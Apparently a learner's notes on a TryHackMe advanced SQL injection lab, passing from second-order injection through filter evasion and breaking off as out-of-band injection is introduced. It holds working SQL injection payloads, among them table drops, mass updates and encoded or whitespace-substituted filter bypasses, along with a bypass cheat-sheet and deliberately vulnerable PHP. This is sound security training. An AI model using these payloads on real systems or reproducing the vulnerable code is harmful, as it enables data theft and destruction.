# Introduction
---

SQLÂ injection remains one of web applications' most severe and widespread security vulnerabilities. This threat arises when an attacker exploits a web application's ability to execute arbitraryÂ SQLÂ queries, leading to unauthorized access to the database, data exfiltration, data manipulation, or even complete control over the application. In this room, we will understand advancedÂ SQLÂ injection techniques, providing a comprehensive understanding of sophisticated attack vectors and mitigation strategies.  

By the end of this room, you will have a deeper understanding of the variousÂ SQLÂ injection techniques.Â ThisÂ will equip you with the skills to identify and exploit these vulnerabilities in multiple scenarios and implement robust defenses to protect your applications.  

Learning Objectives

ï»¿Throughout this room, you will gain a comprehensive understanding of the following key concepts:

- Second-orderÂ SQLÂ injectionÂ  
- Filter evasion
- Out-of-bandÂ SQLÂ Injection
- Automation techniques
- Mitigation measures

Learning Prerequisites

An understanding of the following topics is recommended before starting the room:

- [SQLÂ Injection](https://tryhackme.com/r/room/sqlinjectionlm)
- [SQLMAP](https://tryhackme.com/r/room/sqlmap)
- [OWASPÂ Top 10](https://tryhackme.com/room/owasptop10)
- [Nmap](https://tryhackme.com/r/room/furthernmap)


Before diving in, it's crucial to clearly understand the target machine's database version and operating system details. To achieve this, we can utilizeÂ **Nmap**, a powerful network scanning tool, to thoroughly scan theÂ `MACHINE_IP`. This scan will provide valuable insights into the open ports, running services, and the target machine's operating system. For those unfamiliar withÂ Nmap, we recommend reviewing our comprehensiveÂ NmapÂ room to get up to speed on effectively using this tool. Here is theÂ NmapÂ output after scanning the machine:  

```bash
thm@machine$ nmap -A -T4 -p 3306,3389,445,139,135 MACHINE_IP

Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-25 12:03 BST
Nmap scan report for MACHINE_IP
Host is up (0.00034s latency).

PORT     STATE    SERVICE       VERSION
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
3306/tcp open     mysql
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=SQLi
| Not valid before: 2024-05-23T04:08:44
|_Not valid after:  2024-11-22T04:08:44
|_ssl-date: 2024-05-25T11:03:33+00:00; 0s from scanner time.
MAC Address: 02:87:BD:21:12:33 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds
```

The machine is using MySQL service on Windows.
# Quick Recap
---

In the lastÂ SQLÂ injection room, we explored the basics ofÂ SQLÂ injection, understanding howÂ attackers exploit vulnerabilities in web applications to manipulateÂ SQLÂ queries and access unauthorized data.Â We covered essential techniques, such as error-based and union-basedÂ SQLÂ injection, and blindÂ SQLÂ injection methods, such as boolean-based and time-based attacks. Here is a quick recap of the room covering the core essential types ofÂ SQLÂ injection.

![types of SQL injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989638556)  

In-bandÂ SQLÂ Injection

This technique is considered the most common and straightforward type ofÂ SQLÂ injection attack. In this technique, the attacker uses the same communication channel for both the injection and the retrieval of data. There are two primary types of in-bandÂ SQLÂ injection:  

- **Error-BasedÂ SQLÂ Injection**: The attacker manipulates theÂ SQLÂ query to produce error messages from the database. These error messages often contain information about the database structure, which can be used to exploit the database further. Example:Â `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. If the database version is returned in the error message, it reveals information about the database.
- **Union-Based SQL Injection**: The attacker uses the UNION SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables. Example:Â `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.

Inferential (Blind)Â SQLÂ Injection  

InferentialÂ SQLÂ injection does not transfer data directly through the web application, making exploiting it more challenging. Instead, the attacker sends payloads and observes the applicationâ€™s behavior and response times to infer information about the database. There are two primary types of inferentialÂ SQLÂ injection:  

- **Boolean-Based BlindÂ SQLÂ Injection**: The attacker sends anÂ SQLÂ query to the database, forcing the application to return a different result based on a true or false condition. By analyzing the applicationâ€™s response, the attacker can infer whether the payload was true or false. Example:Â `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`.Â The attacker can infer the result if the page content or behavior changes based on the condition.
- **Time-Based Blind SQL Injection**: The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false. For example,Â `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`. If the response is delayed by 5 seconds, the attacker can infer that the condition was true.

  
Out-of-bandÂ SQLÂ Injection

Out-of-bandÂ SQLÂ injection is used when the attacker cannot use the same channel to launch the attack and gather results or when the server responses are unstable. This technique relies on the database server making an out-of-band request (e.g.,Â HTTPÂ orÂ DNS) to send the query result to the attacker.Â HTTPÂ is normally used in out-of-bandÂ SQLÂ injection to send theÂ query result to the attacker's server.Â We will discuss it in detail in this room.

Each type ofÂ SQLÂ injection technique has its advantages and challenges. Understanding these techniques is crucial for identifying and mitigatingÂ SQLÂ injection vulnerabilities in web applications. In-bandÂ SQLÂ Injection is easy to exploit and detect but noisy and can be easily monitored. Inferential (Blind)Â SQLÂ Injection is more challenging to exploit and requires multiple requests but can be used when detailed error messages are unavailable. Out-of-bandÂ SQLÂ Injection is less common and highly effective, requires external server control, and relies on the databaseâ€™s ability to make out-of-band requests. By mastering these techniques, penetration testers can effectively identify and exploitÂ SQLÂ injection vulnerabilities, helping organizations secure their web applications against these critical threats.

# Second-Order SQL Injection
---

Second-orderÂ SQLÂ injection, also known as storedÂ SQLÂ injection, exploits vulnerabilities where user-supplied input is saved andÂ subsequentlyÂ used in a different part of the application, possibly after some initial processing. This type of attack is more insidious because the maliciousÂ SQLÂ code does not need to immediately result in aÂ SQLÂ syntax error or other obvious issues, making it harder to detect with standard input validation techniques. The injection occurs upon the second use of the data when it is retrieved and used in aÂ SQLÂ command, hence the name "**Second Order**".

![second order sql injection workflow diagram](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989709301)  

Impact

The danger of Second-OrderÂ SQLÂ Injection lies in its ability to bypass typical front-end defences like basic input validation or sanitisation, which only occur at the point of initial data entry. Since the payload does notÂ cause disruption duringÂ the first step, it can be overlooked until it's too late, making the attack particularly stealthy.  

**Example**  
We will be using a book review application. The application allows users to add new books via a web page (`add.php`). Users are prompted to provide details about the book they wish to add to the database. You can access the app atÂ `http://10.10.110.121/second/add.php`[.](http://10.10.110.121/case1.)Â The data collected includes theÂ `SSN`,Â `book_name`, andÂ `author`. Let's consider adding a book with the following details:Â **SSN: UI00012**,Â **Book Name: Intro to PHP**,Â **Author: Tim**. This information is input through a form on theÂ `add.php`Â page, and upon submission, it is stored in theÂ **BookStore**Â database as shown below:

![adding a new book in database](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715774633948)  

As we know, Second-OrderÂ SQLÂ injection is notably challenging to identify. Unlike traditionalÂ SQLÂ Injection, which exploits real-time processing vulnerabilities, it occurs when data previously stored in a database is later used in aÂ SQLÂ query. Detecting this vulnerability often requires understanding how data flows through the application and is reused, necessitating a deep knowledge of the backend operations.  

**Analysis of the Code**

Consider theÂ PHPÂ code snippet used in our application for adding books:

```php
if (isset($_POST['submit'])) {

    $ssn = $conn->real_escape_string($_POST['ssn']);

    $book_name = $conn->real_escape_string($_POST['book_name']);

    $author = $conn->real_escape_string($_POST['author']);

    $sql = "INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')";

    if ($conn->query($sql) === TRUE) {

        echo "<p class='text-green-500'>New book added successfully</p>";

    } else {

        echo "<p class='text-red-500'>Error: " . $conn->error . "</p>";

    }

}
```

The code uses theÂ `real_escape_string()`Â method to escape special characters in the inputs. While this method can mitigate some risks of immediate SQL Injection by escaping single quotes and other SQL meta-characters, it does not secure the application against Second Order SQLi. The key issue here is the lack of parameterised queries, which is essential for preventing SQL injection attacks. When data is inserted using theÂ `real_escape_string()`Â method, it might include payload characters that don't cause immediate harm but can be activated upon subsequent retrieval and use in anotherÂ SQLÂ query. For instance, inserting a book with a name likeÂ `Intro to PHP'; DROP TABLE books;--`Â might not affect theÂ **INSERT**Â operation but could have serious implications if the book name is later used in another SQL context without proper handling.

Let's try adding another book with the SSNÂ `test'`.

  

![total books in the database](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715776065076)

Here we go, the SSNÂ `test'`Â is successfully inserted into the database. The application includes a feature to update book details through an interface likeÂ `update.php`. This interface might display existing book details in editable form fields, retrieved based on earlier stored data, and then update them based on user input. The pentester would investigate whether the application reuses the data (such asÂ `book_name`) that was previously stored and potentially tainted. Then, he would construct SQL queries for updating records using this potentially tainted data without proper sanitisation or parameterisation. By manipulating the update feature, the tester can see if the malicious payload added during the insertion phase gets executed during the update operation. If the application fails to employ proper security practices at this stage, the earlier injected payloadÂ `'; DROP TABLE books; --`Â could be activated, leading to the execution of a harmfulÂ SQLÂ command like dropping a table. You can visit the pageÂ `http://10.10.110.121/second/update.php`Â to update any book details.

![update book content dashboard](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715786150389)  

Now, let's review theÂ `update.php`Â code.Â TheÂ PHPÂ script allows users to update book details within theÂ **BookStore**Â database. Through the query structure, we will analyze a typical scenario where a penetration tester might look forÂ SQLÂ injection vulnerabilities, specifically focusing on how user inputs are handled and utilized inÂ SQLÂ queries.Â 

```php
if ( isset($_POST['update'])) {
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];

    $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
..
...
```

The script begins by checking if the request method is POST and if the update button was pressed, indicating that a user intends to update a book's details. Following this, the script retrieves user inputs directly from the POST data:

```php
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];
```

These variables (`ssn, new_book_name, new_author`) are then used to construct anÂ SQLÂ query for updating the specified book's details in the database:

```php
$update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
```

The script usesÂ `multi_query`Â to execute multiple queries. It also inserts logs into the logs table for analytical purposes.  

Preparing the Payload

We know that we can add or modify the book details based on theirÂ `ssn`. The normal query for updating a book might look like this:

```php
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
```

However, theÂ SQLÂ command could be manipulated if an attacker inserts a specially craftedÂ `ssn`Â value. For example, if the attacker uses theÂ `ssn`Â value:

```php
12345'; UPDATE books SET book_name = 'Hacked'; --
```

When this value is used in the update query, it effectively ends the initial update command afterÂ `12345`Â and starts a new command. This would change theÂ `book_name`Â of all entries in the books table toÂ **Hacked**.  

**Let's do this**

- **Initial Payload Insertion**: A new book is added with the payloadÂ `12345'; UPDATE books SET book_name = 'Hacked'; --`Â is inserted as theÂ `ssn`. The semicolon (`;`) will be used to terminate the currentÂ SQLÂ statement.

![total books in database with injection payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715789331772)  

- **MaliciousÂ SQLÂ Execution**: After that, when the admin or any other user visits the URLÂ `http://10.10.110.121/second/update.php`Â and updates the book, the inserted payload breaks out of the intended SQL command structure and injects a new command that updates all records in the books table. Let's visit the pageÂ Â `http://10.10.110.121/second/update.php page`, update the book name to anything, and click theÂ **Update**Â button. The code will execute the following statement in the backend.

```php
UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name ="hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');
```

- **Commenting Out theÂ Rest**: The double dash (`--`) is an SQL comment symbol. Anything followingÂ `--`Â will be ignored by theÂ SQLÂ server, effectively neutralizing any remaining parts of the originalÂ SQLÂ statement that could cause errors or reveal the attack. Once the above query is executed, it will change the name of all the books toÂ **hacked**, as shown below:

![state of database after executing payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715789376753)

In this task, we explored the Second-OrderÂ SQLÂ injection concept through a vulnerable book review web application. As a penetration tester, examining how user inputs are stored and later utilized withinÂ SQLÂ queries is crucial. This involves verifying that all forms of data handling are secure against such vulnerabilities, emphasizing the importance of thorough testing and knowledge of security practices to safeguard against injection threats.

### Practical
----

Let's begin by going to:

```
http://10.10.223.104/second/add.php
```

We can see this:

![Pasted image 20250505145347.png](../../../IMAGES/Pasted%20image%2020250505145347.png)

We can add books on here, as seen, a book has already been added and it can bee seen in the web application:

```
Books in Database
SSN 	Book Name 	Author
UI00012	Intro to PHP	Tim
```

Let's add a new book with the `SSN` `test'`:


![Pasted image 20250505145406.png](../../../IMAGES/Pasted%20image%2020250505145406.png)

As seen, this was successfully updated into the database, we can update the contents of the books by going to:

```
http://10.10.223.104/second/update.php
```

![Pasted image 20250505145535.png](../../../IMAGES/Pasted%20image%2020250505145535.png)

We can upload the crafted payload provided by the room:

```sql
12345'; UPDATE books SET book_name = 'Hacked'; --
```


Once uploaded, we can visit the `update.php` page and update the payload again:

![Pasted image 20250505145911.png](../../../IMAGES/Pasted%20image%2020250505145911.png)

If we click on update, we can see this:

![Pasted image 20250505145928.png](../../../IMAGES/Pasted%20image%2020250505145928.png)

All book names on the database changed to `hacked`, we can now change them to `compromised` adding this new book:

```sql
1'; UPDATE books SET book_name = 'compromised'; --
```

![Pasted image 20250505150021.png](../../../IMAGES/Pasted%20image%2020250505150021.png)

Let's update it:

![Pasted image 20250505150032.png](../../../IMAGES/Pasted%20image%2020250505150032.png)

Once updated, we can see this:

![Pasted image 20250505150048.png](../../../IMAGES/Pasted%20image%2020250505150048.png)

As seen, we got the flag:

```
THM{SO_HACKED}
```

Now, in order to drop the `hello` table from the database, we can use this payload:

```sql
1'; DROP TABLE hello; -- 
```

![Pasted image 20250505150517.png](../../../IMAGES/Pasted%20image%2020250505150517.png)

Let's update, once we update it, we can see this:

![Pasted image 20250505150537.png](../../../IMAGES/Pasted%20image%2020250505150537.png)

We got our second flag:

```
THM{Table_Dropped}
```


# Filter Evasion Techniques
---

In advancedÂ SQLÂ injection attacks, evading filters is crucial for successfully exploiting vulnerabilities. Modern web applications often implement defensive measures to sanitise or block common attack patterns, making simpleÂ SQLÂ injection attempts ineffective. As pentesters, we must adapt using more sophisticated techniques to bypass these filters. This section will cover such methods, includingÂ **character encoding**,Â **no-quote**Â SQLÂ injection, and handling scenarios whereÂ **spaces**Â cannot be used. We can effectively penetrate web applications with stringent input validation and security controls by understanding and applying these techniques.Â 

![list of keywords for filter evasion](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922193553)

Character Encoding  
Character encoding involves converting special characters in theÂ SQLÂ injection payload into encoded forms that may bypass input filters.  

- **URL Encoding**: URL encoding is a common method where characters are represented using a percent (%) sign followed by their ASCII value in hexadecimal. For example, the payloadÂ `' OR 1=1--`Â can be encoded asÂ `%27%20OR%201%3D1--`. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognise it as malicious during initial processing.
- **Hexadecimal Encoding**: Hexadecimal encoding is another effective technique for constructing SQL queries using hexadecimal values. For instance, the queryÂ `SELECT * FROM users WHERE name = 'admin'`Â can be encoded asÂ `SELECT * FROM users WHERE name = 0x61646d696e`. By representing characters as hexadecimal numbers, the attacker can bypass filters that do not decode these values before processing the input.
- `Unicode Encoding`: Unicode encoding represents characters using Unicode escape sequences. For example, the stringÂ `admin`Â can be encoded asÂ `\u0061\u0064\u006d\u0069\u006e`. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.

**Example**

In this example, we explore how developers can implement basic filtering to prevent SQL injection attacks by removing specific keywords and characters from user input. However, we will also see how attackers can bypass these defences using character encoding techniques like URL encoding.

**Note**: In the upcoming exercises, we will use databases that are different from the last ones. You can access the page atÂ `http://10.10.223.104/encoding/`.

Here's theÂ PHPÂ code (search_books.php) that handles the search functionality:

```php
$book_name = $_GET['book_name'] ?? '';
$special_chars = array("OR", "or", "AND", "and" , "UNION", "SELECT");
$book_name = str_replace($special_chars, '', $book_name);
$sql = "SELECT * FROM books WHERE book_name = '$book_name'";
echo "<p>Generated SQL Query: $sql</p>";
$result = $conn->query($sql) or die("Error: " . $conn->error . " (Error Code: " . $conn->errno . ")");
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
...
..
```

Here's the Javascript code in the index.html page that provides the user interface for searching books:

```php
function searchBooks() {
const bookName = document.getElementById('book_name').value;
const xhr = new XMLHttpRequest();
xhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);
   xhr.onload = function() {
       if (this.status === 200) {
           document.getElementById('results').innerHTML = this.responseText;
```

In the above example, the developer has implemented a basic defence mechanism to preventÂ SQLÂ injection attacks by removing specificÂ SQLÂ keywords, such asÂ `OR`,Â `AND`,Â `UNION`, andÂ `SELECT`. The filtering uses theÂ `str_replace`Â function, which strips these keywords from the user input before they are included in the SQL query. This filtering approach aims to make it harder for attackers to inject malicious SQL commands, as these keywords are essential for many SQL injection payloads.

Preparing the Payload

Let's go through the process of preparing an SQL injection payload step-by-step, showing how URL encoding can bypass basic defences. First, letâ€™s see what happens with a normal input that contains special characters or SQL keywords. When we search for a book namedÂ `Intro to PHP`, we get the successful result as shown below:

![search for a book dashboard](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716201873529)  

But what if we try to break the query by adding special characters likeÂ `'`,Â `;`, etc? We will get the following output:

![error result while searching a book](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716201925761)  

The SQL query is not executing correctly, which probably means there is a chance of SQL Injection. Let's try to inject the payload "`Intro to PHP' OR 1=1`". We will get the following output:

![error result with injection payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716202022860)  

So, what is happening here?Â When this input is passed to theÂ PHPÂ script, theÂ `str_replace`Â function will strip out the OR keyword and the single quote, resulting in a sanitised input that will not execute the intended SQL injection. This input is ineffective because the filtering removes the critical components needed for the SQL injection to succeed.

To bypass the filtering, we need to encode the input using URL encoding, which represents special characters and keywords in a way that the filter does not recognise and remove. Here is the example payloadÂ `1%27%20||%201=1%20--+`.

- `%27`Â is the URL encoding for the single quote (').
- `%20`Â is the URL encoding for a space ( ).
- `||`Â represents the SQL OR operator.
- `%3D`Â is the URL encoding for the equals sign (=).
- `%2D%2D`Â is the URL encoding for --, which starts a comment in SQL.

In the above payload,Â `1'`Â closes the current string or value in theÂ SQLÂ query. For example, if the query is looking for a book name that matches 1, addingÂ `'`Â closes the string, making the rest of the input part of the SQL statement.Â `|| 1=1`Â part uses theÂ SQLÂ `OR`Â operator to add a condition that is always true. This condition ensures that the query returns true for all records, bypassing the original condition that was supposed to restrict the results. Similarly,Â `--`Â starts a comment in SQL, causing the database to ignore the rest of the query. This is useful to terminate any remaining part of the query that might cause syntax errors or unwanted conditions. To ensure proper spacing,Â `+`Â add a space after the comment, ensuring that the comment is properly terminated and there are no syntax issues.

From the console, we can see that clicking the search button makes an AJAX call toÂ `search_book.php`.  

![network tab in console](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716099780661)

_Click to enlarge the image._

Let's use the payload directly on theÂ PHPÂ page to avoid unnecessary tweaking/validation from the client.Â  Let's visit the URLÂ [http://10.10.223.104/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1](http://10.10.223.104/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1)Â with the standard payloadÂ `Intro to PHP' OR 1=1`, and you will see an error.Â 

![testing injection on the API call](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716202208504)  

Now, URL encode the payloadÂ `Intro to PHP' || 1=1 --+`Â usingÂ [Cyber Chef](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\))Â and try to access the URL with an updated payload. We will get the following output dumping the complete information:

![injection with correct payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716100417790)  

The payload works because URL encoding represents the special characters andÂ SQLÂ keywords in a way that bypasses the filtering mechanism. When the server decodes the URL-encoded input, it restores the special characters and keywords, allowing theÂ SQLÂ injection to execute successfully. Using URL encoding, attackers can craft payloads that bypass basic input filtering mechanisms designed to blockÂ SQLÂ injection. This demonstrates the importance of using more robust defences, such as parameterised queries and prepared statements, which can preventÂ SQLÂ injection attacks regardless of the input's encoding.

### Practical
---

Let's begin by going to:

```
http://10.10.223.104/encoding/
```

![Pasted image 20250505150742.png](../../../IMAGES/Pasted%20image%2020250505150742.png)

We can search for books here, let's search for the `Intro to PHP` book:

![Pasted image 20250505150816.png](../../../IMAGES/Pasted%20image%2020250505150816.png)

As seen, we can notice that the `SQL Query` is shown to us on the page, we can try `'` to check if it gives us an error:

![Pasted image 20250505150915.png](../../../IMAGES/Pasted%20image%2020250505150915.png)

As seen, we got an error, this is indeed vulnerable to `SQLI`, if we try a basic payload, this happens:


![Pasted image 20250505151005.png](../../../IMAGES/Pasted%20image%2020250505151005.png)

As seen, there must be a function that strips the keywords such as `OR`, so, our input is not being properly executed in the database, we can use `URL ENCODING` to check the behavior of the application:

```
1%27%20||%201=1%20--+
```

If we submit the request to our proxy, we can see this:

![Pasted image 20250505152153.png](../../../IMAGES/Pasted%20image%2020250505152153.png)

As seen, we got the information of the other books:

```
Answer is: Animal Series
```

# Filter Evasion Techniques (continued)
---

## No-QuoteÂ SQLÂ Injection  

No-QuoteÂ SQLÂ injection techniques are used when the application filters single or double quotes or escapes.  

- **Using Numerical Values**: One approach is to use numerical values or other data types that do not require quotes. For example, instead of injectingÂ `' OR '1'='1`, an attacker can useÂ `OR 1=1`Â in a context where quotes are not necessary. This technique can bypass filters that specifically look for an escape or strip out quotes, allowing the injection to proceed.
- **Using SQL Comments**: Another method involves using SQL comments to terminate the rest of the query. For instance, the inputÂ `admin'--`Â can be transformed intoÂ `admin--`, where theÂ `--`Â signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.
- **Using CONCAT() Function**: Attackers can use SQL functions likeÂ `CONCAT()`Â to construct strings without quotes. For example,Â `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)`Â constructs the string admin. TheÂ `CONCAT()`Â function and similar methods allow attackers to build strings without directly using quotes, making it harder for filters to detect and block the payload.

No Spaces Allowed

When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.

- **Comments to Replace Spaces**: One common method is to use SQL comments (`/**/`) to replace spaces. For example, instead ofÂ `SELECT * FROM users WHERE name = 'admin'`, an attacker can useÂ `SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'`. SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.  
    
- **Tab or Newline Characters**: Another approach is using tab (`\t`) or newline (`\n`) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query likeÂ `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`. This technique can bypass filters that specifically look for spaces.  
    
- **Alternate Characters**:Â One effective method is using alternative URL-encoded characters representing different types of whitespace, such asÂ `%09`Â (horizontal tab),Â `%0A`Â (line feed),Â `%0C`Â (form feed),Â `%0D`Â (carriage return), andÂ `%A0`Â (non-breaking space). These characters can replace spaces in the payload.Â 

Practical Example

In this scenario, we have an endpoint,Â `http://10.10.223.104/space/search_users.php?username=?`Â that returns user details based on the provided username. The developer has implemented filters to block commonÂ SQLÂ injection keywords such as OR, AND, and spaces (%20) to protect againstÂ SQLÂ injection attacks.  

Here is theÂ PHPÂ filtering added by the developer.

```php
$special_chars = array(" ", "AND", "and" ,"or", "OR" , "UNION", "SELECT");
$username = str_replace($special_chars, '', $username);
$sql = "SELECT * FROM user WHERE username = '$username'";
```

If we use our standard payloadÂ `1%27%20||%201=1%20--+`Â on the endpoint, we can see that even through URL encoding, it is not working.

![injection with incorrect payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716108426440)

The SQL query shows that the spaces are being omitted by code.Â To bypass these protections, we can use URL-encoded characters that represent different types of whitespace or line breaks, such asÂ `%09`Â (horizontal tab),Â `%0A`Â (line feed). These characters can replace spaces and still be interpreted correctly by the SQL parser.

The original payloadÂ `1' OR 1=1 --`Â can be modified to use newline characters instead of spaces, resulting in the payloadÂ `1'%0A||%0A1=1%0A--%27+`. This payload constructs the same logical condition asÂ `1' OR 1=1 --`Â but uses newline characters to bypass the space filter.

The SQL parser interprets the newline characters as spaces, transforming the payload intoÂ `1' OR 1=1 --`. Therefore, the query will be interpreted fromÂ `SELECT * FROM users WHERE username = '$username'`Â toÂ `SELECT * FROM users WHERE username = '1' OR 1=1 --`.

Now, if we access the endpoint through an updated payload, we can view all the details.Â 

![injection with correct payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716108947600)  

To summarise, it is important to understand that no single technique guarantees a bypass when dealing with filters or Web Application Firewalls (WAFs) designed to preventÂ SQLÂ injection attacks.Â However, here are some tips and tricks that can be used to circumvent these protections. This table highlights various techniques that can be employed to try and bypass filters and WAFs:

|   |   |   |
|---|---|---|
|**Scenario**|**Description**|**Example**|
|**Keywords like SELECT are banned**|SQLÂ keywords can often be bypassed by changing their case or adding inline comments to break them up|SElEcT * FrOm users or SE/**/LECT * FROM/**/users|
|**Spaces are banned**|Using alternative whitespace characters or comments to replace spaces can help bypass filters.|SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users|
|**Logical operators like AND, OR are banned**|Using alternative logical operators or concatenation to bypass keyword filters.|username = 'admin' && password = 'password' or username = 'admin'/**/\|/**/1=1 --|
|**Common keywords like UNION, SELECT are banned**|Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.|SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)|
|**Specific keywords like OR, AND, SELECT, UNION are banned**|Using obfuscation techniques to disguiseÂ SQLÂ keywords by combining characters with string functions or comments.|SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users|

  

In real environments, the queries you apply and the visibility of filtered keywords are not directly possible. As a pentester, it is important to understand thatÂ SQLÂ injection testing often involves a hit-and-trial approach, requiring patience and perseverance. Each environment can have unique filters and protections, making it necessary to adapt and try different techniques to find a successful injection vector.

### Practical
---

Let's go to:

```
http://10.10.223.104/space/search_users.php?username=?
```

![Pasted image 20250505153216.png](../../../IMAGES/Pasted%20image%2020250505153216.png)

As seen, we can use our previous payload and we get this:

```
http://10.10.223.104/space/search_users.php?username=1%27%20||%201=1%20--+
```

![Pasted image 20250505153305.png](../../../IMAGES/Pasted%20image%2020250505153305.png)

Still does not work, seems like the filter is better on this page, it seems like the spaces are being omitted by the code, we can replace them by whitespaces and line breaks: 

```
%09 or %0A
```

Let's use this payload then:

```
http://10.10.223.104/space/search_users.php?username=1'%0A||%0A1=1%0A--%27+
```

![Pasted image 20250505153437.png](../../../IMAGES/Pasted%20image%2020250505153437.png)

It worked, there we got our answer:

```
Password for attacker user is: tesla
```

# Out-of-band SQL Injection
---

Out-of-band (OOB)Â SQLÂ injection is an attack technique that pentester/red teamers use to exfiltrate data or execute malicious actions when direct or traditional methods are ineffective. Unlike In-bandÂ SQLÂ injection, where the attacker relies on the same channel for attack and data retrieval, Out-of-bandÂ SQLÂ injection utilises separate channels for sending the payload and receiving the response. Out-of-band techniques leverage features likeÂ **HTTP**Â requests,Â **DNS**Â queries,Â **SMB**Â protocol, or other network protocols that the database server might have access to, enabling attackers to circumvent firewalls, intrusion detection systems, and other security measures.

![process flow of OOB injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1717060822273)  

One of the key advantages of Out-of-bandÂ SQLÂ injection is its stealth and reliability. By usingÂ **different communication channels**, attackers can minimise the risk of detection and maintain a persistent connection with the compromised system. For instance, an attacker might inject aÂ **SQLÂ payload that triggers the database server to make aÂ DNSÂ request**Â to a malicious domain controlled by the attacker. The response can then be used to extract sensitive data without alerting security mechanisms that monitor direct database interactions. This method allows attackers to exploit vulnerabilities even in complex network environments where direct connectivity between the attacker and the target is limited or scrutinised.Â 

Why Use OOB

